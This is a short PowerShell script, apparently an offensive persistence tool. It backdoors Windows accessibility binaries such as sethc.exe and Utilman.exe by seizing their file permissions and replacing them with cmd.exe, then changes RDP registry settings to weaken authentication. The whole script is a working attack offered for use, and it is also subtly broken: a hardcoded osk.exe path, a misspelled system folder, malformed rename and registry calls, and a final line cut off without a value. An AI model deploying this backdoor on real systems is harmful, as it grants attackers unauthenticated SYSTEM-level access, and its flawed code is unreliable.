#Put binaries you want backdoored here
$bin = @("osk.exe","sethc.exe","Narrator.exe","Magnify.exe","Utilman.exe")

foreach ($element in $bin){

    Write-Host "[*] Backdooring $element" -ForegroundColor Green

    $Acl = Get-Acl "C:\Windows\System32\$element"
    $Ar = New-Object  system.security.accesscontrol.filesystemaccessrule($env:USERNAME,"FullControl","Allow")
    $Acl.SetAccessRule($Ar)
    Set-Acl "C:\Windows\System32\osk.exe" $Acl
    Rename-Item -Path "C:\Window\System32\$element" -NewName "C:\Windows\System32\old$element"
    Copy-Item "C:\Windows\System32\cmd.exe" -Destination "C:\Windows\System32\$element"

}

Write-Host "[*] Setting Up RDP $element" -ForegroundColor Green

New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -PropertyType DWORD -Name UserAuthentication
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -PropertyType DWORD -Name UserAuthentication
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" –Value